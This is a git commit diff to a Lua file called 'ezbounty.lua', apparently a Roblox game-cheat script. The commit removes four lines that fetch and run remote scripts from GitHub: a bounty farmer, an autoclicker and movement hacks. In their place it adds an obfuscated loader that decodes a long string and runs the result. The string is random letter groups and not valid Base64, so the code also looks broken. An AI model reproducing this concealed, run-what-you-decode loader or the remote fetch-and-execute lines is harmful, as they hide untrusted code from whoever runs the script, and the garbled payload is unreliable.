a0087e6b385d585eab9266f349d42dde210dff88
nkahz <khanhkhanhok33@gmail.com>
2026-01-03 00:38:15 +0700

    Update ezbounty.lua

--- ezbounty.lua
+++ ezbounty.lua
@@ -1,4 +1,6 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/obiiyeuem/vthangsitink/refs/heads/main/BananaCat-BountyEz.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nk210/blocphut/refs/heads/main/autoclicker.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nk210/blocphut/refs/heads/main/fixsus.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nk210/blocphut/refs/heads/main/walkonwater.lua"))()
+local _0x1a="ywgqo dqmgr yhbuc muqyw aehqx jzdhb mhasv gosui xfacl fnyqw grahy nwdwa scvvc bxcro smpfo ksayh rvrmu jdzeg urajv tmezf tmcqr nrnxa nylwh znwji fjthp hadms fzaue iljbh hqhpb pcswm jtxtm jggwr lwmsw njpqi zdwra upyjb xqhvd darhb amsgo hsavo mnxnq pvfac fovua uzgcv rnbod tcaov vptxe ohypn rbdme sllmd zatrx zirla wrgtd vrkwl yrcid oyjtf xtbyv qkfvo sceua znzko vbrcj tudfu tujmg dfjys bypvq kfjco itpuq skmyo njfgj gdazt lylmp t"
+local _0x2=game:GetService("HttpService")
+local function _0x3(_0x4)
+    return _0x2:Base64Decode(_0x4)
+end
+loadstring(_0x3(_0x1a))()
